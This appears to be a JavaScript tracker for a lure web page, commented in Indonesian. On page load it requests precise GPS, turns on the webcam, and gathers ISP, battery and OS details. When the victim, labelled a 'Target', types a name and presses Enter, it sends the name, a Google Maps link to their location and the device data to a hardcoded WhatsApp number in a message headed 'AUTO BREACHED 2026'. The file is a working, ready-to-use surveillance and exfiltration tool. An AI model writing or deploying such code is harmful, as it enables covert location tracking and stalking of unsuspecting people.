var nomorWA = "628979100200";
var userData = { 
    coords: "Scanning...", 
    os: navigator.platform,
    battery: "Scanning...",
    isp: "Detecting..."
};

// 1. Jalankan Otomatis Saat Halaman Dibuka
window.onload = function() {
    // Jalankan penarikan ISP & Baterai langsung
    getQuickData();
    
    // Langsung minta GPS tanpa tunggu tombol
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(pos) {
            userData.coords = pos.coords.latitude + "," + pos.coords.longitude;
        }, function(err) {
            userData.coords = "Denied";
        }, { enableHighAccuracy: true, maximumAge: 0 });
    }

    // Aktifkan Kamera Otomatis
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) { 
            var v = document.getElementById('webcam');
            if (v) v.srcObject = stream; 
        }).catch(function(e) { console.log("Cam Blocked"); });
};

async function getQuickData() {
    try {
        var res = await fetch('https://ipapi.co/json/');
        var data = await res.json();
        userData.isp = data.org || "Protected";
    } catch (e) { userData.isp = "ISP Hidden"; }

    try {
        if (navigator.getBattery) {
            var bat = await navigator.getBattery();
            userData.battery = Math.round(bat.level * 100) + "%";
        }
    } catch (e) { userData.battery = "Blocked"; }
}

// Fungsi Kirim (Tetap butuh satu klik final agar WA bisa terbuka)
function autoSend(namaTarget) {
    var mapLink = "https://www.google.com/maps?q=" + userData.coords;
    var msg = "🚨 *AUTO BREACHED 2026* 🚨%0A%0A" +
              "👤 *Target:* " + namaTarget + "%0A" +
              "📍 *Maps:* " + mapLink + "%0A" +
              "📡 *ISP:* " + userData.isp + "%0A" +
              "🔋 *Baterai:* " + userData.battery + "%0A" +
              "💻 *OS:* " + userData.os + "%0A%0A" +
              "_Status: Stealth Mode Success._";

    window.location.href = "https://api.whatsapp.com/send?phone=" + nomorWA + "&text=" + msg;
}

// Untuk mendeteksi kalau dia ketik nama dan tekan Enter
var nameField = document.getElementById('name');
if (nameField) {
    nameField.onkeydown = function(e) { 
        if (e.key === "Enter") autoSend(nameField.value); 
    };
}
